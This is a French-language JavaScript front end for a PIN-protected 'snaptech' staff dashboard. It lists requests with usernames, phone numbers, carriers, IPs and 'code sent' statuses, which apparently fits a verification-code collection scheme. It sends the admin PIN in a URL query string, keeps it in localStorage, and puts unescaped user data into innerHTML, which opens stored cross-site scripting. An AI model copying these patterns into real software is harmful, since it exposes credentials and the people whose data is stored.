const API_ADMIN = '/api/admin-data';
const API_ADMIN_BAN = '/api/admin-ban';

// Gestion des inputs PIN
const pinInputs = document.querySelectorAll('.pin-digit');
pinInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        const val = e.target.value.replace(/\D/g, '');
        e.target.value = val;
        if (val && index < pinInputs.length - 1) pinInputs[index + 1].focus();
    });
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) pinInputs[index - 1].focus();
        if (e.key === 'Enter') verifyPin();
    });
    input.addEventListener('paste', (e) => {
        e.preventDefault();
        const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
        for (let i = 0; i < paste.length && i < pinInputs.length; i++) pinInputs[i].value = paste[i];
    });
});

async function verifyPin() {
    const btn = document.getElementById('pinBtn');
    const status = document.getElementById('pinStatus');
    let pin = '';
    pinInputs.forEach(i => pin += i.value);

    if (pin.length !== 6) {
        status.textContent = '⚠️ Code à 6 chiffres requis';
        status.className = 'status-message error';
        return;
    }

    btn.classList.add('loading');
    btn.disabled = true;

    try {
        const res = await fetch(`${API_ADMIN}?pin=${pin}`);
        const data = await res.json();

        if (data.success) {
            localStorage.setItem('snaptech_staff_pin', pin);
            showDashboard(data);
        } else {
            status.textContent = '❌ Code incorrect';
            status.className = 'status-message error';
            pinInputs.forEach(i => i.value = '');
            pinInputs[0].focus();
        }
    } catch (e) {
        status.textContent = '❌ Erreur réseau';
        status.className = 'status-message error';
    } finally {
        btn.classList.remove('loading');
        btn.disabled = false;
    }
}

function showDashboard(data) {
    document.getElementById('loginScreen').style.display = 'none';
    document.getElementById('dashboardScreen').style.display = 'block';
    renderStats(data.stats);
    renderRequests(data.requests);
}

function renderStats(stats) {
    const container = document.getElementById('dashStats');
    const labels = {
        total: 'Total', pending: 'En attente', processing: 'En cours',
        waiting_code: 'Code envoyé', completed: 'Terminées', wrong_number: 'Wrong Number'
    };
    container.innerHTML = Object.entries(stats).map(([key, val]) => `
        <div class="stat-card">
            <div class="stat-value">${val}</div>
            <div class="stat-label">${labels[key] || key}</div>
        </div>
    `).join('');
}

function renderRequests(requests) {
    const tbody = document.getElementById('requestsBody');
    const statusClass = {
        pending: 'badge-pending', processing: 'badge-processing',
        waiting_code: 'badge-waiting', completed: 'badge-completed', wrong_number: 'badge-wrong'
    };
    const statusLabel = {
        pending: 'En attente', processing: 'En cours', waiting_code: 'Code envoyé',
        completed: 'Terminé', wrong_number: 'Wrong Number'
    };
    const carrierNames = {
        orange: 'Orange', sfr: 'SFR', bouygues: 'Bouygues',
        base: 'BASE', orange_be: 'Orange BE', proximus: 'Proximus', telenet: 'Telenet'
    };

    tbody.innerHTML = requests.map(r => `
        <tr>
            <td>#${r.id}</td>
            <td>${r.username}</td>
            <td>${r.phone}</td>
            <td>${carrierNames[r.operator] || r.operator}</td>
            <td>${r.country || '-'}</td>
            <td>${r.ip_address || '-'}</td>
            <td><span class="badge ${statusClass[r.status] || 'badge-pending'}">${statusLabel[r.status] || r.status}</span></td>
            <td>${new Date(r.created_at).toLocaleString('fr-FR', { day:'2-digit', month:'2-digit', hour:'2-digit', minute:'2-digit' })}</td>
            <td>${r.ip_address ? `<button class="ban-btn" onclick="banIp('${r.ip_address}')">Ban</button>` : '-'}</td>
        </tr>
    `).join('');
}

async function loadData() {
    const pin = localStorage.getItem('snaptech_staff_pin');
    if (!pin) { logout(); return; }
    try {
        const res = await fetch(`${API_ADMIN}?pin=${pin}`);
        const data = await res.json();
        if (data.success) {
            renderStats(data.stats);
            renderRequests(data.requests);
        } else {
            logout();
        }
    } catch (e) {
        console.error('Refresh error:', e);
    }
}

async function banIp(ip) {
    if (!confirm(`Bannir l'IP ${ip} ?`)) return;
    const pin = localStorage.getItem('snaptech_staff_pin');
    try {
        const res = await fetch(API_ADMIN_BAN, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ pin, ip })
        });
        const data = await res.json();
        alert(data.success ? `🚫 IP ${ip} bannie` : `❌ ${data.message}`);
        if (data.success) loadData();
    } catch (e) {
        alert('❌ Erreur réseau');
    }
}

function logout() {
    localStorage.removeItem('snaptech_staff_pin');
    document.getElementById('loginScreen').style.display = 'block';
    document.getElementById('dashboardScreen').style.display = 'none';
    pinInputs.forEach(i => i.value = '');
    document.getElementById('pinStatus').textContent = '';
}

// Auto-login si PIN enregistré
document.addEventListener('DOMContentLoaded', () => {
    const savedPin = localStorage.getItem('snaptech_staff_pin');
    if (savedPin) loadData();
});

window.verifyPin = verifyPin;
window.loadData = loadData;
window.banIp = banIp;
window.logout = logout;
